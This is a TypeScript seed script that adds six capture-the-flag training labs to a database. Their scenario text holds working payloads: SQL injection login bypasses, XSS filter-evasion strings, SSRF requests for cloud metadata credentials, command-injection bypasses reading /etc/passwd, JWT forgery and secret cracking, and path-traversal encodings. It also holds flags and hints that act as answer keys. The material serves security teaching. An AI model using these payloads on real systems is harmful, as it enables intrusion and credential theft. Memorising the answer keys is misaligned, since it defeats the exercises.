import { db } from "../src/lib/db"

// Labs inspired by PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings)
// Real-world payloads and techniques from the security community.
const NEW_LABS = [
  {
    title: "SQL Injection — Authentication Bypass Payloads",
    slug: "sqli-auth-bypass-payloads",
    category: "Web Security",
    difficulty: "Easy",
    durationMin: 20,
    points: 150,
    description: "Master SQLi authentication bypass using real-world payloads from PayloadsAllTheThings.",
    longDescription:
      "Practice SQL injection authentication bypass with the exact payloads used by professional pentesters. Learn tautology-based bypass, UNION-based extraction, and WAF evasion techniques from the PayloadsAllTheThings repository.",
    scenario:
      "## Mission Briefing\n\nTarget: `http://vulnlab.local/login`\n\nThe login form concatenates user input directly into a SQL query:\n```sql\nSELECT * FROM users WHERE username='$user' AND password='$pass'\n```\n\n## Authentication Bypass Payloads (from PayloadsAllTheThings)\n\n### Basic Tautology\n```\nadmin' --\nadmin' #\nadmin'/*\n' OR '1'='1\n' OR '1'='1' --\n' OR '1'='1' #\n' OR '1'='1'/*\n') OR '1'='1' --\n') OR '1'='1' #\n```\n\n### Admin-specific\n```\nadmin' OR 1=1 --\nadmin' OR 1=1 #\nadmin'--\n```\n\n### No-space bypass (WAF evasion)\n```\n'OR'1'='1\n'OR'1'='1'--\nadmin'OR1=1--\n```\n\nYour objective: log in as `admin` using any of these payloads as both username and password (or just username with `--` comment).",
    objectives: "Try the basic tautology payload|Try the admin-specific bypass|Try the no-space bypass|Find the FLAG in the users table",
    hints: "Try ' OR '1'='1' -- as username|The # comment also works in MySQL|For no-space: 'OR'1'='1|The flag column is named 'flag'",
    flag: "FLAG{p4yl04d5_4ll_th3_th1ng5_sql1}",
    commands: "whoami|curl|sqlmap|help",
    color: "violet",
  },
  {
    title: "XSS Filter Bypass — WAF Evasion Techniques",
    slug: "xss-filter-bypass-waf",
    category: "Web Security",
    difficulty: "Hard",
    durationMin: 45,
    points: 350,
    description: "Bypass XSS filters using advanced encoding and polyglot payloads from PayloadsAllTheThings.",
    longDescription:
      "Learn to bypass XSS filters and WAFs using the comprehensive filter bypass techniques from PayloadsAllTheThings. Practice with case variation, encoding bypasses, HTML entity encoding, JSFuck, Unicode, and polyglot payloads.",
    scenario:
      "## Mission Briefing\n\nTarget: `http://vulnlab.local/search?q=`\n\nThe search page reflects the `q` parameter but filters `<script>`, `javascript:`, and `onerror=`.\n\n## Filter Bypass Payloads (from PayloadsAllTheThings)\n\n### Case Variation\n```html\n<ScRiPt>alert(1)</ScRiPt>\n<IMG SRC=JaVaScRiPt:alert(1)>\n```\n\n### Incomplete HTML Tag (bypasses tag blacklist)\n```html\n<img src=x onerror=alert(1)//\n<svg onload=alert(1)//\n```\n\n### Bypass onxxxx= Blacklist\n```html\n<svg/onload=alert(1)>\n<img src=x onerror=alert(1)>\n<body onload=alert(1)>\n<details open ontoggle=alert(1)>\n```\n\n### No Parenthesis\n```html\n<img src=x onerror=alert`1`>\n<img src=x onerror=alert(1)>\n<img src=x onerror=window['ale'+'rt'](1)>\n```\n\n### HTML Entity Encoding\n```html\n<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>\n<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)\">click</a>\n```\n\n### JSFuck (bypasses character filters)\n```javascript\n[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]...\n```\n\nYour objective: get `alert(1)` to fire on the search page.",
    objectives: "Try case variation bypass|Try incomplete HTML tag|Try no-parenthesis technique|Capture the admin cookie (flag)",
    hints: "Case variation: <ScRiPt>|Incomplete tag: <svg onload=alert(1)//|No parens: alert`1`|HTML entities work too",
    flag: "FLAG{xss_w4f_byp4ss_p4yl04d5}",
    commands: "whoami|curl|nc|help",
    color: "violet",
  },
  {
    title: "SSRF — Cloud Metadata Exploitation",
    slug: "ssrf-cloud-metadata",
    category: "Cloud Security",
    difficulty: "Hard",
    durationMin: 40,
    points: 400,
    description: "Exploit SSRF to access cloud metadata endpoints and steal IAM credentials using PayloadsAllTheThings techniques.",
    longDescription:
      "Practice Server-Side Request Forgery against cloud instances. Learn to bypass IP filters, access cloud metadata endpoints (AWS/GCP/Azure), and extract IAM credentials using the techniques documented in PayloadsAllTheThings.",
    scenario:
      "## Mission Briefing\n\nTarget: `http://vulnlab.local/fetch?url=`\n\nThe server fetches any URL you provide. The flag is in the cloud metadata.\n\n## SSRF Bypass Techniques (from PayloadsAllTheThings)\n\n### Cloud Metadata Endpoints\n```\n# AWS (IMDSv1)\nhttp://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]\n\n# GCP\nhttp://metadata.google.internal/computeMetadata/v1/\nhttp://169.254.169.254/computeMetadata/v1/\n(Header: Metadata-Flavor: Google)\n\n# Azure\nhttp://169.254.169.254/metadata/instance?api-version=2021-02-01\n(Header: Metadata: true)\n```\n\n### Bypassing localhost filters\n```\nhttp://127.0.0.1:80/\nhttp://0.0.0.0/\nhttp://[::1]/\nhttp://localhost/\nhttp://127.1/\nhttp://127.0.0.1.nip.io/\nhttp://0x7f000001/ (hex)\nhttp://2130706433/ (decimal)\nhttp://017700000001/ (octal)\n```\n\n### URL Scheme Exploitation\n```\nfile:///etc/passwd\ngopher://\ndict://\nsftp://\n```\n\nYour objective: access the AWS metadata endpoint and extract the IAM access key (which is the flag).",
    objectives: "Try the AWS metadata URL|Bypass the IP filter if blocked|Extract IAM credentials|Submit the flag",
    hints: "Metadata IP: 169.254.169.254|Try /latest/meta-data/iam/security-credentials/|The role name is 'vulnapp-role'|Access key ID is wrapped in FLAG{}",
    flag: "FLAG{ssrf_cl0ud_m3t4d4t4_3xpl01t3d}",
    commands: "whoami|curl|nc|help",
    color: "cyan",
  },
  {
    title: "Command Injection — Filter Bypass Masterclass",
    slug: "command-injection-bypass",
    category: "Web Security",
    difficulty: "Hard",
    durationMin: 40,
    points: 350,
    description: "Bypass command injection filters using advanced techniques from PayloadsAllTheThings.",
    longDescription:
      "Master command injection filter bypass using the comprehensive techniques from PayloadsAllTheThings. Practice with space-less injection, character filter bypasses, brace expansion, backtick execution, and wildcard expansion.",
    scenario:
      "## Mission Briefing\n\nTarget: `http://vulnlab.local/ping?host=`\n\nThe server executes `ping $host` but filters spaces, semicolons, and pipe characters.\n\n## Filter Bypass Techniques (from PayloadsAllTheThings)\n\n### Chaining Commands (when not filtered)\n```\n; ls\n| ls\n&& ls\n|| ls\n& ls\n%0a ls (newline)\n```\n\n### Bypass Without Space\n```\n{ls,-la}        # brace expansion\n$IFS             # internal field separator (whitespace)\n$IFS$9           # IFS + arbitrary digit\n${IFS}           # same as $IFS\n<                # redirect instead of space: cat</etc/passwd\n```\n\n### Bypass Character Filters\n```\nc''at /etc/passwd     # single quotes\nc\"\"at /etc/passwd     # double quotes\nc\\at /etc/passwd      # backslash\n`cat /etc/passwd`     # backticks\n$(cat /etc/passwd)    # command substitution\n```\n\n### Bypass with Wildcards\n```\n/bin/ca? /etc/pas?wd\n/???/??t /???/??ss??\n```\n\n### Bypass with Variable Expansion\n```\necho $HOME → /root\np${PATH:0:1}ngthat → ping (if PATH starts with /)\n```\n\nYour objective: read `/root/flag.txt` despite the space and semicolon filters.",
    objectives: "Try the brace expansion bypass|Use $IFS for spaces|Try wildcard expansion|Read /root/flag.txt",
    hints: "Spaces blocked? Use $IFS or {cmd,arg}|Semicolons blocked? Use %0a (newline)|Wildcards: /???/??t /???/??ss??|Or try backticks: `cat /root/flag.txt`",
    flag: "FLAG{c0mm4nd_1nj3ct10n_byp4ss}",
    commands: "whoami|ls|cat|curl|nc|find|help",
    color: "red",
  },
  {
    title: "JWT Token Forgery — alg:none & Secret Brute Force",
    slug: "jwt-forgery-brute-force",
    category: "Web Security",
    difficulty: "Hard",
    durationMin: 45,
    points: 400,
    description: "Forge JWT tokens using alg:none bypass and brute-force weak HMAC secrets from PayloadsAllTheThings.",
    longDescription:
      "Practice JWT attack techniques from PayloadsAllTheThings: the alg:none bypass, weak HMAC secret brute-forcing with hashcat, and RS256-to-HS256 algorithm confusion attacks.",
    scenario:
      "## Mission Briefing\n\nTarget: `http://vulnlab.local/api/profile`\n\nThe API uses JWT for authentication. Your current token:\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.something\n```\n\n## JWT Attack Techniques (from PayloadsAllTheThings)\n\n### 1. alg:none Bypass\nSet the header algorithm to 'none' and remove the signature:\n```json\nHeader: {\"alg\":\"none\",\"typ\":\"JWT\"}\nPayload: {\"user\":\"admin\",\"role\":\"admin\"}\nSignature: (empty)\n```\nFinal token: `base64(header).base64(payload).`\n\n### 2. HMAC Secret Brute Force\n```bash\n# Using hashcat\nhashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt\n\n# Using jwt-cracker\njwt-cracker -t \"eyJhbG...\" -d \"abcdefghijklmnopqrstuvwxyz\"\n```\nCommon weak secrets: `secret`, `password`, `123456`, `key`, `jwt_secret`\n\n### 3. RS256 → HS256 Confusion\nIf the server uses RS256 (asymmetric), you can:\n1. Get the server's public key\n2. Switch algorithm to HS256 (symmetric)\n3. Sign the token with the public key as the HMAC secret\n\nYour objective: access `/admin/flag` as admin.",
    objectives: "Decode the current JWT|Try alg:none bypass|Brute-force the HMAC secret|Access /admin/flag",
    hints: "Decode JWT: split by '.' and base64-decode each part|alg:none: set header alg to 'none', drop signature|The secret is in rockyou.txt (common word)|It's a 6-letter common word",
    flag: "FLAG{jwt_4lg_n0n3_4nd_bru73_f0rc3}",
    commands: "whoami|curl|base64|hashcat|help",
    color: "violet",
  },
  {
    title: "Directory Traversal — Path Normalization Bypass",
    slug: "directory-traversal-bypass",
    category: "Web Security",
    difficulty: "Medium",
    durationMin: 30,
    points: 250,
    description: "Exploit directory traversal with path normalization bypass techniques from PayloadsAllTheThings.",
    longDescription:
      "Practice directory traversal / path traversal attacks using bypass techniques from PayloadsAllTheThings. Learn URL encoding, double encoding, null byte injection, and Unicode normalization tricks.",
    scenario:
      "## Mission Briefing\n\nTarget: `http://vulnlab.local/view?file=`\n\nThe server serves files from `/var/www/files/` but blocks `../` sequences.\n\n## Traversal Bypass Payloads (from PayloadsAllTheThings)\n\n### Basic (if not filtered)\n```\n../../../etc/passwd\n..\\..\\..\\windows\\win.ini\n```\n\n### URL Encoding\n```\n%2e%2e%2f       → ../\n%2e%2e/         → ../\n..%2f           → ../\n%2e%2e%5c       → ..\\\n```\n\n### Double URL Encoding\n```\n%252e%252e%252f  → ../ (server decodes twice)\n%252e%252e%255c  → ..\\\n```\n\n### Unicode Encoding\n```\n..%c0%af        → ../ (overlong UTF-8)\n..%ef%bc%8f     → ../ (fullwidth slash)\n..%c0%ae%c0%ae/ → ../../\n```\n\n### Null Byte (PHP < 5.3)\n```\n../../../etc/passwd%00.txt\n```\n\n### Bypass with absolute paths\n```\n/var/www/files/../../../etc/passwd\n/etc/passwd (if server does realpath)\n```\n\nYour objective: read `/etc/passwd` (the flag is in the root's comment field).",
    objectives: "Try URL-encoded traversal|Try double encoding|Try Unicode encoding|Read /etc/passwd",
    hints: "Basic ../ is blocked|Try %2e%2e%2f for ../|Double encode: %252e%252e%252f|The flag is in root's GECOS field",
    flag: "FLAG{d1r_tr4v3rs4l_byp4ss_p4yl04d5}",
    commands: "whoami|curl|cat|help",
    color: "violet",
  },
]

async function main() {
  console.log("Adding PayloadsAllTheThings-based labs...")
  let added = 0
  for (const lab of NEW_LABS) {
    const existing = await db.lab.findUnique({ where: { slug: lab.slug } })
    if (!existing) {
      await db.lab.create({ data: lab })
      added++
      console.log(`  + ${lab.title}`)
    } else {
      console.log(`  = ${lab.title} (exists)`)
    }
  }
  console.log(`Done. Added ${added} new labs.`)
}

main()
  .catch((e) => { console.error(e); process.exit(1) })
  .finally(async () => { await db.$disconnect() })
